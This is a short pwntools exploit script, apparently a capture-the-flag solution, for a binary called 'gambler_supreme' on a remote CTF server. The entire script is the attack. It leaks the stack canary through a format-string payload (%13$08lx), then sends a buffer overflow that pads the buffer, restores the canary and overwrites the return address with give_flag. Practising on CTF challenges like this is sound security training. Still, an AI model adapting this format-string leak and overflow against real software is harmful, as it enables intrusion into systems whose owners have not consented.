from pwn import *

elf = ELF("./gambler_supreme")
#sock = process(elf.path)
sock = remote("ctf.b01lers.com",9201)

sock.sendlineafter(b"Enter a difficulty between 1 and 7 (inclusive): ", b"1")

#payloads = b"cc\x00aaaaabbbbbbbbcc"

payloads = b"%13$08lx"
sock.sendlineafter(b"Guess me a string of length 1 with lowercase letters: ", payloads)
sock.recvuntil(b"Your guess: ")
leak_cookie = sock.recvline()
leak_cookie = int("0x"+leak_cookie[:-1].decode(),16) 

payloads = b"a" * 40
payloads += p64(leak_cookie)
payloads += b"b" * 8
payloads += p64(elf.symbols["give_flag"])
sock.sendlineafter(b"Guess me a string of length 1 with lowercase letters: ", payloads)

#for i in range(92):
#    print(i)
#    sock.sendlineafter(b"Guess me a string of length 1 with lowercase letters: ", payloads)

sock.interactive()
